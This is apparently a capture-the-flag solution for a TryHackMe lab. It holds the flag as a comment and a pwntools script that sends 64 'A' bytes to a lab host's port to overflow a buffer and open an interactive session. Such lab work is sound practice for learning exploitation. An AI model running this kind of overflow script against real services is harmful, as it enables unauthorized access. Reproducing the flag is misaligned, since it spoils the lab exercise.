#THM{7h4t's_4n_3zy_oveRflowwwww}
from pwn import *

host  = '10.10.155.54' 
port = 9001
p = remote(host, port)

payload = b"A"*64
p.send(payload)

p.interactive()